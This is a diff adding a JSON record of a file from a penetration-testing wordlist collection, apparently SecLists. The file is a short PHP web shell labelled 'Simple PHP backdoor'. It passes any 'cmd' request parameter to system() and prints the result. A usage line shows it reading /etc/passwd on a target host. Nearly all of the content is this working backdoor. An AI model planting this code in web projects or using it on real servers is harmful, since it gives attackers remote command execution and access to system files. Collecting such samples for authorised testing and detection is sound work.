@@ -1,0 +1,9 @@
+{
+  "source": "github",
+  "source_id": "github:danielmiessler/SecLists:Web-Shells/FuzzDB/cmd-simple.php",
+  "title": "danielmiessler/SecLists/Web-Shells/FuzzDB/cmd-simple.php",
+  "text": "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->\n\n<?php\n\nif(isset($_REQUEST['cmd'])){\n        echo \"<pre>\";\n        $cmd = ($_REQUEST['cmd']);\n        system($cmd);\n        echo \"</pre>\";\n        die;\n}\n\n?>\n\nUsage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd\n\n<!--    http://michaeldaw.org   2006    -->\n",
+  "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Web-Shells/FuzzDB/cmd-simple.php",
+  "language": "php",
+  "kind": "code"
+}
